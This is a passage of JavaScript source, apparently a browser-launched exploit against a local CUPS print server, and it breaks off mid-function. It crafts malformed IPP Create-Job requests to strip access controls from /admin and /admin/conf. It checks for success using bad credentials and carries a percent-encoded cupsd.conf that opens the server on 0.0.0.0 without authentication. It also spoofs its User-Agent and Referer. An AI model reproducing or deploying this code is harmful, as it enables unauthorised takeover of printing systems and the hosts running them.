function do_alert(message) {
  // alert(message);
}

function do_debug(message) {
  // alert(message);
}

var IppAttributeType = {
  IPP_TAG_CUPS_INVALID:-1,
  IPP_TAG_ZERO:0,
  IPP_TAG_OPERATION:1,
  IPP_TAG_JOB:2,
  IPP_TAG_END:3,
  IPP_TAG_PRINTER:4,
  IPP_TAG_UNSUPPORTED_GROUP:5,
  IPP_TAG_SUBSCRIPTION:6,
  IPP_TAG_EVENT_NOTIFICATION:7,
  IPP_TAG_RESOURCE:8,
  IPP_TAG_DOCUMENT:9,
  IPP_TAG_UNSUPPORTED_VALUE:0x10,
  IPP_TAG_DEFAULT:0x11,
  IPP_TAG_UNKNOWN:0x12,
  IPP_TAG_NOVALUE:0x13,
  IPP_TAG_NOTSETTABLE:0x15,
  IPP_TAG_DELETEATTR:0x16,
  IPP_TAG_ADMINDEFINE:0x17,
  IPP_TAG_INTEGER:0x21,
  IPP_TAG_BOOLEAN:0x22,
  IPP_TAG_ENUM:0x23,
  IPP_TAG_STRING:0x30,
  IPP_TAG_DATE:0x31,
  IPP_TAG_RESOLUTION:0x32,
  IPP_TAG_RANGE:0x33,
  IPP_TAG_BEGIN_COLLECTION:0x34,
  IPP_TAG_TEXTLANG:0x35,
  IPP_TAG_NAMELANG:0x36,
  IPP_TAG_END_COLLECTION:0x37,
  IPP_TAG_TEXT:0x41,
  IPP_TAG_NAME:0x42,
  IPP_TAG_RESERVED_STRING:0x43,
  IPP_TAG_KEYWORD:0x44,
  IPP_TAG_URI:0x45,
  IPP_TAG_URISCHEME:0x46,
  IPP_TAG_CHARSET:0x47,
  IPP_TAG_LANGUAGE:0x48,
  IPP_TAG_MIMETYPE:0x49,
  IPP_TAG_MEMBERNAME:0x4a,
  IPP_TAG_EXTENSION:0x7f,
}

var IppOpType = {
  IPP_OP_CUPS_INVALID: -1,
  IPP_PRINT_JOB: 2,
  IPP_PRINT_URI: 3,
  IPP_VALIDATE_JOB: 4,
  IPP_CREATE_JOB: 5,
  IPP_SEND_DOCUMENT: 6,
  IPP_SEND_URI: 7,
  IPP_CANCEL_JOB: 8,
  IPP_GET_JOB_ATTRIBUTES: 9,
  IPP_GET_JOBS: 10,
  IPP_GET_PRINTER_ATTRIBUTES: 11,
  IPP_HOLD_JOB: 12,
  IPP_RELEASE_JOB: 13,
  IPP_RESTART_JOB: 14,
  IPP_PAUSE_PRINTER: 0x0010,
  IPP_RESUME_PRINTER: 0x0011,     
  IPP_PURGE_JOBS: 0x0012,
  IPP_SET_PRINTER_ATTRIBUTES: 0x0013,
  IPP_SET_JOB_ATTRIBUTES: 0x0014,
  IPP_GET_PRINTER_SUPPORTED_VALUES: 0x0015,
  IPP_CREATE_PRINTER_SUBSCRIPTION: 0x0016,
  IPP_CREATE_JOB_SUBSCRIPTION: 0x0017,
  IPP_GET_SUBSCRIPTION_ATTRIBUTES: 0x0018,
  IPP_GET_SUBSCRIPTIONS: 0x0019,
  IPP_RENEW_SUBSCRIPTION: 0x001a,
  IPP_CANCEL_SUBSCRIPTION: 0x001b,
  IPP_GET_NOTIFICATIONS: 0x001c,
  IPP_SEND_NOTIFICATIONS: 0x001d,
  IPP_GET_RESOURCE_ATTRIBUTES: 0x001e,
  IPP_GET_RESOURCE_DATA: 0x001f,
  IPP_GET_RESOURCES: 0x0020,
  IPP_GET_PRINT_SUPPORT_FILES: 0x0021,
  IPP_ENABLE_PRINTER: 0x0022,
  IPP_DISABLE_PRINTER: 0x0023,
  IPP_PAUSE_PRINTER_AFTER_CURRENT_JOB: 0x0024,
  IPP_HOLD_NEW_JOBS: 0x0025,
  IPP_RELEASE_HELD_NEW_JOBS: 0x0026,
  IPP_DEACTIVATE_PRINTER: 0x0027,
  IPP_ACTIVATE_PRINTER: 0x0028,
  IPP_RESTART_PRINTER: 0x0029,
  IPP_SHUTDOWN_PRINTER: 0x002a,
  IPP_STARTUP_PRINTER: 0x002b,
  IPP_REPROCESS_JOB: 0x002c,
  IPP_CANCEL_CURRENT_JOB: 0x002d,
  IPP_SUSPEND_CURRENT_JOB: 0x002e,
  IPP_RESUME_JOB: 0x002f,
  IPP_PROMOTE_JOB: 0x0030,
  IPP_SCHEDULE_JOB_AFTER: 0x0031,
  IPP_CANCEL_DOCUMENT: 0x0033,   
  IPP_GET_DOCUMENT_ATTRIBUTES: 0x0034,
  IPP_GET_DOCUMENTS: 0x0035,
  IPP_DELETE_DOCUMENT: 0x0036,
  IPP_SET_DOCUMENT_ATTRIBUTES: 0x0037,
  IPP_CANCEL_JOBS: 0x0038,
  IPP_CANCEL_MY_JOBS: 0x0039,
  IPP_RESUBMIT_JOB: 0x003a,
  IPP_CLOSE_JOB: 0x003b,
  IPP_IDENTIFY_PRINTER: 0x003c,
  IPP_VALIDATE_DOCUMENT: 0x003d,
  IPP_PRIVATE: 0x4000,
  CUPS_GET_DEFAULT: 0x4001,
  CUPS_GET_PRINTERS: 0x4002,
  CUPS_ADD_MODIFY_PRINTER: 0x4003,
  CUPS_DELETE_PRINTER: 0x4004,
  CUPS_GET_CLASSES: 0x4005,
  CUPS_ADD_MODIFY_CLASS: 0x4006,
  CUPS_DELETE_CLASS: 0x4007,
  CUPS_ACCEPT_JOBS: 0x4008,
  CUPS_REJECT_JOBS: 0x4009,
  CUPS_SET_DEFAULT: 0x400a,
  CUPS_GET_DEVICES: 0x400b,
  CUPS_GET_PPDS: 0x400c,
  CUPS_MOVE_JOB: 0x400d,
  CUPS_AUTHENTICATE_JOB: 0x400e,
  CUPS_GET_PPD: 0x400f,
  CUPS_GET_DOCUMENT: 0x4027,
}

var kIppVersion2 = 0x0200;
var RequestId = 0;

function GetNextRequestId() {
  if (RequestId == 0) {
    RequestId = Math.round(+new Date() / 1000);
    RequestId += Math.floor(Math.random() * 1000000);
  }
  return RequestId++;
}

var Config = {
  admin_conf_location_string_: "/admin/conf",
  admin_conf_leak_count_: 10,
  admin_location_string_: "/admin",
  admin_leak_count_: 10,
  host_: "localhost",
  port_: 631,
  printer_name_: "",
  printer_uri_base_: "printers",
  config_uri_: "admin/conf/cupsd.conf",
  user_agent_: "CUPS/2.0.2",
  referer_: "http://www.google.com/search?q=test",
  bad_username_: "baduser",
  bad_password_: "badpass",

  AdminConfLocation: function() {
    return this.admin_conf_location_string_;
  },

  AdminConfLeakCount: function() {
    return this.admin_conf_leak_count_;
  },

  AdminLocation: function() {
    return this.admin_location_string_;
  },

  AdminLeakCount: function() {
    return this.admin_leak_count_;
  },

  Host: function() {
    return this.host_;
  },

  SetHost: function(host) {
    this.host_ = host;
  },

  Port: function() {
    return this.port_;
  },

  SetPort: function(port) {
    this.port_ = port;
  },

  PrinterName: function() {
    return this.printer_name_;
  },

  SetPrinterName: function(printer_name) {
    this.printer_name_ = printer_name;
  },

  PrinterUriBase: function() {
    return this.printer_uri_base_;
  },

  IppUri: function() {
    return ("ipp://" + this.host_ + ":" + this.port_ + "/" + this.printer_uri_base_ + "/" + this.printer_name_);
  },

  HttpUriPrinter: function() {
    return ("http://" + this.host_ + ":" + this.port_ + "/" + this.printer_uri_base_ + "/" + this.printer_name_);
  },

  HttpConfigUri: function() {
    return ("http://" + this.host_ + ":" + this.port_ + "/" + this.config_uri_);
  },

  HttpUriGetPrinters: function() {
    return ("http://" + this.host_ + ":" + this.port_ + "/" + this.printer_uri_base_ + "/");
  },

  HttpTestAuthUri: function() {
    return ("http://" + this.host_ + ":" + this.port_ + this.admin_conf_location_string_);
  },

  UserAgent: function() {
    return this.user_agent_;
  },

  SetUserAgent: function(user_agent) {
    this.user_agent_ = user_agent;
  },

  Referer: function() {
    return this.referer_;
  },

  SetReferer: function(referer) {
    this.referer_ = referer;
  },

  BadUserName: function() {
    return this.bad_username_;
  },

  SetBadUserName: function(bad_username) {
    this.bad_username_ = bad_username;
  },

  BadPassword: function() {
    return this.bad_password_;
  },

  SetBadPassword: function(bad_password) {
    this.bad_password_ = bad_password;
  },
}

function get_new_mainheader() {
  var IppMainHeader = {
    ver_: 0,
    op_: 0,
    request_id_: 0,
    GetVersion: function () {
      return this.ver_;
    },
    GetOp: function () {
      return this.op_;
    },
    GetRequestId: function() {
      return this.request_id_;
    },
    SetVersion: function(ver) {
      do_debug("Setting main header version to " + ver);
      this.ver_ = ver;
    },
    SetOp: function(op) {
      do_debug("Setting main header op to " + op);
      this.op_ = op;
    },
    SetRequestId: function(request_id) {
      do_debug("Setting main header request ID to " + request_id);
      this.request_id_ = request_id;
    },
  }
  return IppMainHeader;
}

function get_new_attribute() {
  var IppAttribute = {
    type_: IppAttributeType.IPP_TAG_CUPS_INVALID,
    name_: "",
    value_language_: "",
    value_string_: "",
    value_numeric_: 0,
    value_bool_: false,
    value_range_: {},
    value_date_: "",

    GetType: function() {
      return this.type_;
    },

    GetName: function() {
      switch(this.type_) {
        case IppAttributeType.IPP_TAG_CUPS_INVALID:
        case IppAttributeType.IPP_TAG_END:
          do_alert("GetName() on invalid attribute type.");
          return "";
      }
      return this.name_;
    },

    GetValue: function() {
      switch(this.type_) {
        case IppAttributeType.IPP_TAG_TEXTLANG:
        case IppAttributeType.IPP_TAG_NAMELANG:
        case IppAttributeType.IPP_TAG_TEXT:
        case IppAttributeType.IPP_TAG_NAME:
        case IppAttributeType.IPP_TAG_KEYWORD:
        case IppAttributeType.IPP_TAG_URI:
        case IppAttributeType.IPP_TAG_URISCHEME:
        case IppAttributeType.IPP_TAG_CHARSET:
        case IppAttributeType.IPP_TAG_LANGUAGE:
        case IppAttributeType.IPP_TAG_MIMETYPE:
        case IppAttributeType.IPP_TAG_DATE:
        case IppAttributeType.IPP_TAG_RESOLUTION:
          return this.value_string_;
        case IppAttributeType.IPP_TAG_INTEGER:
        case IppAttributeType.IPP_TAG_ENUM:
          return this.value_numeric_;
        case IppAttributeType.IPP_TAG_BOOLEAN:
          return this.value_bool_;
      }
      do_alert("GetValue() on invalid attribute type.");
      return undefined;
    },

    GetValueRangeLower: function() {
      if (this.type_ == IppAttributeType.IPP_TAG_RANGE) {
        return this.value_range_[0];
      }
      do_alert("GetValueRangeLower() on invalid attribute type.");
      return undefined;
    },

    GetValueRangeUpper: function() {
      if (this.type == IppAttributeType.IPP_TAG_RANGE) {
        return this.value_range_[1];
      }
      do_alert("GetValueRangeUpper() on invalid attribute type.");
    },

    GetLanguage: function() {
      switch(this.type_) {
        case IppAttributeType.IPP_TAG_TEXTLANG:
        case IppAttributeType.IPP_TAG_NAMELANG:
          return this.value_language_;
      }
      do_alert("GetLanguage() on invalid attribute type.");
      return undefined;
    },

    SetType: function(type) {
      this.type_ = type;
    },

    SetName: function(name) {
      this.name_ = name;
    },

    SetLanguage: function(language) {
      this.value_language_ = language;
    },

    SetValueString: function(string) {
      this.value_string_ = string;
    },

    SetValueNumeric: function(value) {
      this.value_numeric_ = value;
    },

    SetValueBool: function(value) {
      this.value_bool_ = value;
    },

    SetValueRange: function(value_lower, value_upper) {
      this.value_range_[0] = value_lower;
      this.value_range_[1] = value_upper;
    },
  }

  return IppAttribute;
}

function get_new_ipp_parser() {
  var IppParser = {
    input_: "",
    offset_: 0,
    header_: get_new_mainheader(),
    attributes_: {},

    Initialize: function(input) {
      this.input_ = input;
      this.offset_ = 0;
    },

    InputLeft: function(len) {
      if (this.offset_ >= this.input_.length || (this.input_.length - this.offset_) < len) {
        do_alert("Out of input in InputLeft(), only have " + (this.input_.length - this.offset_) + ", requested " + len);
        return false;
      }
      return true;
    },

    SkipInput: function(len) {
      this.offset_ += len;
    },

    ReadUint8: function() {
      if (!this.InputLeft(1)) {
        do_alert("Out of input in ReadUint8()");
        return 0;
      }
      var x = this.input_.charCodeAt(this.offset_);
      do_debug("Reading input char: " + x + " from offset: " + this.offset_);
      this.offset_++;
      return x;
    },

    ReadUint16BE: function() {
      if (!this.InputLeft(2)) {
        do_alert("Out of input in ReadUint16BE()");
        return 0;
      }
      var x = 0;
      for (var i = 0; i < 2; i++) {
        x *= 256;
        x += this.ReadUint8();
      }
      return x;
    },

    ReadUint32BE: function() {
      if (!this.InputLeft(4)) {
        do_alert("Out of input in ReadUint32BE()");
        return 0;
      }
      var x = 0;
      for (var i = 0; i < 4; i++) {
        x *= 256;
        x += this.ReadUint8();
      }
      return x;
    },

    ReadString: function(len) {
      if (!this.InputLeft(len)) {
        do_alert("Out of input in ReadString()");
        return "";
      }
      var x = "";
      while (len > 0) {
        x += String.fromCharCode(this.ReadUint8());
        len--;
      }
      return x;
    },

    ParseMainHeader: function() {
      do_debug("Reading main header from offset " + this.offset_);
      this.header_.SetVersion(this.ReadUint16BE());
      this.header_.SetOp(this.ReadUint16BE());
      this.header_.SetRequestId(this.ReadUint32BE());
    },

    ParseTagType: function() {
      do_debug("Reading tag type from offset " + this.offset_);
      var tag = this.ReadUint8();
      if (tag == IppAttributeType.IPP_TAG_EXTENSION) {
        return this.ReadUint32BE();
      }
      return tag;
    },

    ParseName: function() {
      do_debug("Reading name from offset " + this.offset_);
      var len = this.ReadUint16BE();
      if (len == 0)
        return "";
      return this.ReadString(len);
    },

    ParseAttributeName: function(attribute) {
      var name = this.ParseName();
      attribute.SetName(name);
    },

    ParseValue: function(attribute) {
      do_debug("Reading value from offset " + this.offset_);
      var len = this.ReadUint16BE();
      if (!this.InputLeft(len)) {
        do_alert("Out of input for value of length " + len + " in ParseValue().");
        return false;
      }
      switch (attribute.GetType()) {
        case IppAttributeType.IPP_TAG_INTEGER:
        case IppAttributeType.IPP_TAG_ENUM:
          {
            if (len != 4) {
              do_alert("Bad length for integer, should be 4, but instead is " + len);
              return false;
            }
            attribute.SetValueNumeric(this.ReadUint32BE());
            return true;
          }
        case IppAttributeType.IPP_TAG_BOOLEAN:
          {
            if (len != 1) {
              do_alert("Bad length for bool, should be 4, but instead is " + len);
              return false;
            }
            var x = this.ReadUint8();
            if (x == 0) {
              attribute.SetValueBool(false);
            } else {
              attribute.SetValueBool(true);
            }
            return true;
          }
        case IppAttributeType.IPP_TAG_TEXT:
        case IppAttributeType.IPP_TAG_NAME:
        case IppAttributeType.IPP_TAG_KEYWORD:
        case IppAttributeType.IPP_TAG_URI:
        case IppAttributeType.IPP_TAG_URISCHEME:
        case IppAttributeType.IPP_TAG_CHARSET:
        case IppAttributeType.IPP_TAG_LANGUAGE:
        case IppAttributeType.IPP_TAG_MIMETYPE:
          {
            attribute.SetValueString(this.ReadString(len));
            return true;
          }
        case IppAttributeType.IPP_TAG_TEXTLANG:
        case IppAttributeType.IPP_TAG_NAMELANG:
          {
            attribute.SetLanguage(this.ReadString(len));
            len = this.ReadUint16BE();
            attribute.SetValueString(this.ReadString(len));
            return true;
          }
        case IppAttributeType.IPP_TAG_RANGE:
          {
            if (len != 8) {
              do_alert("Bad length for range, should be 8, but instead is " + len);
              return false;
            }
            var lower = this.ReadUint32BE();
            var upper = this.ReadUint32BE();
            attribute.SetValueRange(lower, upper);
            return true;
          }
        case IppAttributeType.IPP_TAG_DATE:
          {
            if (len != 11) {
              do_alert("Bad length for date, should be 11, but instead is " + len);
              return false;
            }
            this.SkipInput(len);
            return true;
          }
      }
      this.SkipInput(len);
      return true;
    },

    ParseAttribute: function(attribute) {
      var tag = this.ParseTagType();
      attribute.SetType(tag);
      if (tag < IppAttributeType.IPP_TAG_UNSUPPORTED_VALUE)
        return true;
      this.ParseAttributeName(attribute);
      return this.ParseValue(attribute);
    },

    ParseAttributes: function() {
      var attribute_count = 0;
      var named_attribute_count = 0;
      while(true) {
        do_debug("Reading attribute " + attribute_count + " from offset " + this.offset_);
        var attribute = get_new_attribute();
        if (!this.ParseAttribute(attribute)) {
          do_alert("Error parsing attribute number " + attribute_count + " in ParseAttributes().");
          return false;
        }
        var type = attribute.GetType();
        if (type == IppAttributeType.IPP_TAG_END) {
          do_alert("Done parsing attributes, got " + attribute_count + " attributes, with " + named_attribute_count + " named attributes.");
          break;
        }

        attribute_count++;
        
        if (type < IppAttributeType.IPP_TAG_UNSUPPORTED_VALUE)
          continue;

        named_attribute_count++;

        var name = attribute.GetName();
        do_debug("Got attribute named: " + name);
        this.attributes_[name] = attribute;
      }
      return true;
    },

    ParseResponse: function() {
      this.ParseMainHeader();
      if (this.header_.GetVersion() != kIppVersion2) {
        do_alert("Got invalid IPP version in response, expected " + kIppVersion2 + ", but got " + this.header_.GetVersion());
        return false;
      }
      if (this.header_.GetOp() != 0) {
        do_alert("Got invalid IPP operation number in response, expected 0, but got " + this.header_.GetOp());
        return false;
      }
      if (!this.ParseAttributes()) {
        do_alert("Error parsing attributes in response.");
        return false;
      }
      do_alert("Successfully parsed IPP response.");
      return true;
    },

    HaveAttribute: function(name) {
      if (this.attributes_[name] === undefined)
        return false;
      return true;
    },

    GetAttribute: function(name) {
      return this.attributes_[name];
    },
  }

  return IppParser;
}

function get_new_ipp_request_builder() {
  var IppRequestBody = {
    body_: "",

    Clear: function() {
      this.body_ = "";
    },

    AppendUint8: function(x) {
      this.body_ += String.fromCharCode(x);
    },

    AppendUint16BE: function(x) {
      this.AppendUint8((x >> 8) & 0xff);
      this.AppendUint8(x & 0xff);
    },

    AppendUint32BE: function(x) {
      this.AppendUint8((x >> 24) & 0xff);
      this.AppendUint8((x >> 16) & 0xff);
      this.AppendUint8((x >> 8) & 0xff);
      this.AppendUint8(x & 0xff);
    },

    BuildRequestHeader: function(op, request_id) {
      this.AppendUint16BE(kIppVersion2);
      this.AppendUint16BE(op);
      this.AppendUint32BE(request_id);
    },

    StartAttributesGroup: function(group_tag) {
      this.AppendUint8(group_tag);
    },

    AppendString: function(str) {
      for (var i = 0; i < str.length; i++) {
        this.AppendUint8(str.charCodeAt(i));
      }
    },

    AppendCountedString: function(str) {
      this.AppendUint16BE(str.length);
      this.AppendString(str);
    },

    AppendAttributeBoolean: function(type, name, value) {
      this.AppendUint8(type);
      this.AppendCountedString(name);
      this.AppendUint16BE(1);
      if (value == false || value == 0) {
        this.AppendUint8(0);
      } else {
        this.AppendUint8(1);
      }
    },

    AppendAttributeInteger: function(type, name, value) {
      this.AppendUint8(type);
      this.AppendCountedString(name);
      this.AppendUint16BE(4);
      this.AppendUint32BE(value);
    },

    AppendAttributeString: function(type, name, value) {
      this.AppendUint8(type);
      this.AppendCountedString(name);
      this.AppendCountedString(value);
    },

    AppendLeakValue: function(name, value1, language, value2, count) {
      this.AppendUint8(IppAttributeType.IPP_TAG_NAME);
      this.AppendCountedString(name);
      this.AppendCountedString(value1);
      this.AppendUint8(IppAttributeType.IPP_TAG_NAME);
      this.AppendUint16BE(0);
      this.AppendCountedString(value1);

      for (var i = 0; i < count; i++) {
        this.AppendUint8(IppAttributeType.IPP_TAG_NAME);
        this.AppendUint16BE(0);
        this.AppendCountedString(value1);
      }

      this.AppendUint8(IppAttributeType.IPP_TAG_NAMELANG);
      this.AppendUint16BE(0);
      this.AppendUint16BE(language.length + value2.length + 4);
      this.AppendCountedString(language);
      this.AppendCountedString(value2);
    },

    BuildGetPrinterNameRequest: function() {
      this.Clear();
      this.BuildRequestHeader(IppOpType.CUPS_GET_PRINTERS, GetNextRequestId());

      this.StartAttributesGroup(IppAttributeType.IPP_TAG_OPERATION);
      this.AppendAttributeString(IppAttributeType.IPP_TAG_CHARSET, "attributes-charset", "us-ascii");
      this.AppendAttributeString(IppAttributeType.IPP_TAG_LANGUAGE, "attributes-natural-language", "us-ascii");
      this.AppendAttributeString(IppAttributeType.IPP_TAG_NAME, "requesting-user-name", "lpadmin");

      this.StartAttributesGroup(IppAttributeType.IPP_TAG_END);
      return this.body_;
    },

    BuildIppRequestLeak: function(leak_string, leak_count) {
      this.Clear();
      this.BuildRequestHeader(IppOpType.IPP_CREATE_JOB, GetNextRequestId());

      this.StartAttributesGroup(IppAttributeType.IPP_TAG_OPERATION);
      this.AppendAttributeString(IppAttributeType.IPP_TAG_CHARSET, "attributes-charset", "us-ascii");
      this.AppendAttributeString(IppAttributeType.IPP_TAG_LANGUAGE, "attributes-natural-language", leak_string);
      this.AppendAttributeString(IppAttributeType.IPP_TAG_URI, "printer-uri", Config.IppUri());
      this.AppendAttributeString(IppAttributeType.IPP_TAG_NAME, "requesting-user-name", leak_string);

      this.StartAttributesGroup(IppAttributeType.IPP_TAG_JOB);
      this.AppendAttributeInteger(IppAttributeType.IPP_TAG_INTEGER, "copies", 1);
      this.AppendLeakValue("job-originating-host-name", "value1string", leak_string, "value2string", leak_count);

      this.StartAttributesGroup(IppAttributeType.IPP_TAG_END);
      return this.body_;
    },

    BuildIppRequestClearAdminConf: function() {
      return this.BuildIppRequestLeak(Config.AdminConfLocation(), Config.AdminConfLeakCount());
    },

    BuildIppRequestClearAdmin: function() {
      return this.BuildIppRequestLeak(Config.AdminLocation(), Config.AdminLeakCount());
    },

    BuildIppRequestConfigBody: function() {
  return unescape("%23%0a%23%20%22%24%49%64%3a%20%63%75%70%73%64%2e%63%6f%6e%66%2e%69%6e%20%39%30%37%37%20%32%30%31%30%2d%30%34%2d%30%35%20%30%30%3a%35%39%3a%33%30%5a%20%6d%69%6b%65%20%24%22%0a%23%0a%23%20%53%61%6d%70%6c%65%20%63%6f%6e%66%69%67%75%72%61%74%69%6f%6e%20%66%69%6c%65%20%66%6f%72%20%74%68%65%20%43%55%50%53%20%73%63%68%65%64%75%6c%65%72%2e%20%20%53%65%65%20%22%6d%61%6e%20%63%75%70%73%64%2e%63%6f%6e%66%22%20%66%6f%72%20%61%0a%23%20%63%6f%6d%70%6c%65%74%65%20%64%65%73%63%72%69%70%74%69%6f%6e%20%6f%66%20%74%68%69%73%20%66%69%6c%65%2e%0a%23%0a%0a%23%20%4c%6f%67%20%67%65%6e%65%72%61%6c%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%20%69%6e%20%65%72%72%6f%72%5f%6c%6f%67%20%2d%20%63%68%61%6e%67%65%20%22%77%61%72%6e%22%20%74%6f%20%22%64%65%62%75%67%22%0a%23%20%66%6f%72%20%74%72%6f%75%62%6c%65%73%68%6f%6f%74%69%6e%67%2e%2e%2e%0a%4c%6f%67%4c%65%76%65%6c%20%64%65%62%75%67%0a%0a%23%20%41%64%6d%69%6e%69%73%74%72%61%74%6f%72%20%75%73%65%72%20%67%72%6f%75%70%2e%2e%2e%0a%53%79%73%74%65%6d%47%72%6f%75%70%20%61%64%6d%69%6e%0a%53%79%73%74%65%6d%47%72%6f%75%70%41%75%74%68%4b%65%79%20%73%79%73%74%65%6d%2e%70%72%69%6e%74%2e%61%64%6d%69%6e%0a%0a%23%20%4f%6e%6c%79%20%6c%69%73%74%65%6e%20%66%6f%72%20%63%6f%6e%6e%65%63%74%69%6f%6e%73%20%66%72%6f%6d%20%74%68%65%20%6c%6f%63%61%6c%20%6d%61%63%68%69%6e%65%2e%0a%4c%69%73%74%65%6e%20%30%2e%30%2e%30%2e%30%3a%36%33%31%0a%4c%69%73%74%65%6e%20%2f%70%72%69%76%61%74%65%2f%76%61%72%2f%72%75%6e%2f%63%75%70%73%64%0a%0a%23%20%53%68%6f%77%20%73%68%61%72%65%64%20%70%72%69%6e%74%65%72%73%20%6f%6e%20%74%68%65%20%6c%6f%63%61%6c%20%6e%65%74%77%6f%72%6b%2e%0a%42%72%6f%77%73%69%6e%67%20%4f%6e%0a%42%72%6f%77%73%65%4f%72%64%65%72%20%61%6c%6c%6f%77%2c%64%65%6e%79%0a%42%72%6f%77%73%65%41%6c%6c%6f%77%20%61%6c%6c%0a%42%72%6f%77%73%65%4c%6f%63%61%6c%50%72%6f%74%6f%63%6f%6c%73%20%64%6e%73%73%64%0a%0a%23%20%44%65%66%61%75%6c%74%20%61%75%74%68%65%6e%74%69%63%61%74%69%6f%6e%20%74%79%70%65%2c%20%77%68%65%6e%20%61%75%74%68%65%6e%74%69%63%61%74%69%6f%6e%20%69%73%20%72%65%71%75%69%72%65%64%2e%2e%2e%0a%44%65%66%61%75%6c%74%41%75%74%68%54%79%70%65%20%42%61%73%69%63%0a%0a%23%20%57%65%62%20%69%6e%74%65%72%66%61%63%65%20%73%65%74%74%69%6e%67%2e%2e%2e%0a%57%65%62%49%6e%74%65%72%66%61%63%65%20%59%65%73%0a%0a%23%20%52%65%73%74%72%69%63%74%20%61%63%63%65%73%73%20%74%6f%20%74%68%65%20%73%65%72%76%65%72%2e%2e%2e%0a%3c%4c%6f%63%61%74%69%6f%6e%20%2f%3e%0a%20%20%4f%72%64%65%72%20%64%65%6e%79%2c%61%6c%6c%6f%77%0a%3c%2f%4c%6f%63%61%74%69%6f%6e%3e%0a%0a%23%20%53%65%74%20%74%68%65%20%64%65%66%61%75%6c%74%20%70%72%69%6e%74%65%72%2f%6a%6f%62%20%70%6f%6c%69%63%69%65%73%2e%2e%2e%0a%3c%50%6f%6c%69%63%79%20%64%65%66%61%75%6c%74%3e%0a%20%20%23%20%4a%6f%62%2f%73%75%62%73%63%72%69%70%74%69%6f%6e%20%70%72%69%76%61%63%79%2e%2e%2e%0a%20%20%4a%6f%62%50%72%69%76%61%74%65%41%63%63%65%73%73%20%64%65%66%61%75%6c%74%0a%20%20%4a%6f%62%50%72%69%76%61%74%65%56%61%6c%75%65%73%20%64%65%66%61%75%6c%74%0a%20%20%53%75%62%73%63%72%69%70%74%69%6f%6e%50%72%69%76%61%74%65%41%63%63%65%73%73%20%64%65%66%61%75%6c%74%0a%20%20%53%75%62%73%63%72%69%70%74%69%6f%6e%50%72%69%76%61%74%65%56%61%6c%75%65%73%20%64%65%66%61%75%6c%74%0a%0a%20%20%3c%4c%69%6d%69%74%20%41%6c%6c%3e%0a%20%20%20%20%4f%72%64%65%72%20%64%65%6e%79%2c%61%6c%6c%6f%77%0a%20%20%3c%2f%4c%69%6d%69%74%3e%0a%3c%2f%50%6f%6c%69%63%79%3e%0a%0a%23%20%53%65%74%20%74%68%65%20%61%75%74%68%65%6e%74%69%63%61%74%65%64%20%70%72%69%6e%74%65%72%2f%6a%6f%62%20%70%6f%6c%69%63%69%65%73%2e%2e%2e%0a%3c%50%6f%6c%69%63%79%20%61%75%74%68%65%6e%74%69%63%61%74%65%64%3e%0a%20%20%23%20%4a%6f%62%2f%73%75%62%73%63%72%69%70%74%69%6f%6e%20%70%72%69%76%61%63%79%2e%2e%2e%0a%20%20%4a%6f%62%50%72%69%76%61%74%65%41%63%63%65%73%73%20%64%65%66%61%75%6c%74%0a%20%20%4a%6f%62%50%72%69%76%61%74%65%56%61%6c%75%65%73%20%64%65%66%61%75%6c%74%0a%20%20%53%75%62%73%63%72%69%70%74%69%6f%6e%50%72%69%76%61%74%65%41%63%63%65%73%73%20%64%65%66%61%75%6c%74%0a%20%20%53%75%62%73%63%72%69%70%74%69%6f%6e%50%72%69%76%61%74%65%56%61%6c%75%65%73%20%64%65%66%61%75%6c%74%0a%0a%20%20%3c%4c%69%6d%69%74%20%41%6c%6c%3e%0a%20%20%20%20%4f%72%64%65%72%20%64%65%6e%79%2c%61%6c%6c%6f%77%0a%20%20%3c%2f%4c%69%6d%69%74%3e%0a%3c%2f%50%6f%6c%69%63%79%3e%0a%0a%23%20%53%65%74%20%74%68%65%20%6b%65%72%62%65%72%69%7a%65%64%20%70%72%69%6e%74%65%72%2f%6a%6f%62%20%70%6f%6c%69%63%69%65%73%2e%2e%2e%0a%3c%50%6f%6c%69%63%79%20%6b%65%72%62%65%72%6f%73%3e%0a%20%20%23%20%4a%6f%62%2f%73%75%62%73%63%72%69%70%74%69%6f%6e%20%70%72%69%76%61%63%79%2e%2e%2e%0a%20%20%4a%6f%62%50%72%69%76%61%74%65%41%63%63%65%73%73%20%64%65%66%61%75%6c%74%0a%20%20%4a%6f%62%50%72%69%76%61%74%65%56%61%6c%75%65%73%20%64%65%66%61%75%6c%74%0a%20%20%53%75%62%73%63%72%69%70%74%69%6f%6e%50%72%69%76%61%74%65%41%63%63%65%73%73%20%64%65%66%61%75%6c%74%0a%20%20%53%75%62%73%63%72%69%70%74%69%6f%6e%50%72%69%76%61%74%65%56%61%6c%75%65%73%20%64%65%66%61%75%6c%74%0a%0a%20%20%3c%4c%69%6d%69%74%20%41%6c%6c%3e%0a%20%20%20%20%4f%72%64%65%72%20%64%65%6e%79%2c%61%6c%6c%6f%77%0a%20%20%3c%2f%4c%69%6d%69%74%3e%0a%3c%2f%50%6f%6c%69%63%79%3e%0a%0a%23%0a%23%20%45%6e%64%20%6f%66%20%22%24%49%64%3a%20%63%75%70%73%64%2e%63%6f%6e%66%2e%69%6e%20%39%30%37%37%20%32%30%31%30%2d%30%34%2d%30%35%20%30%30%3a%35%39%3a%33%30%5a%20%6d%69%6b%65%20%24%22%2e%0a%23%0a");
    },
  }

  return IppRequestBody;
}

function printer_name_body() {
  var builder = get_new_ipp_request_builder();
  return builder.BuildGetPrinterNameRequest();
}

function leak_admin_body() {
  var builder = get_new_ipp_request_builder();
  return builder.BuildIppRequestClearAdmin();
}

function leak_admin_conf_body() {
  var builder = get_new_ipp_request_builder();
  return builder.BuildIppRequestClearAdminConf();
}

function get_config_body() {
  var builder = get_new_ipp_request_builder();
  return builder.BuildIppRequestConfigBody();
}

function getHTTPObject() {
  return new XMLHttpRequest();
}

function already_exploited() {
  var req = getHTTPObject();
  req.open("GET", Config.HttpTestAuthUri(), false, Config.BadUserName(), Config.BadPassword());
  req.setRequestHeader("User-Agent", Config.UserAgent());
  req.setRequestHeader("Referer", Config.Referer());
  req.send("");
  if (req.status == 200) {
    return true;
  } else if (req.status == 401) {
    return false;
  }
  do_alert("Unknown response status when checking for exploitation: " + req.status);
  return false;
}

function xhr_post_send(uri, body, expected_response_code) {
  var req = getHTTPObject();
  req.open("POST", uri, false);
  req.setRequestHeader("Content-Type", "application/ipp");
  req.setRequestHeader("User-Agent", Config.UserAgent());
  req.setRequestHeader("Referer", Config.Referer());
  req.sendAsBinary(body);
  if (req.status != expected_response_code) {
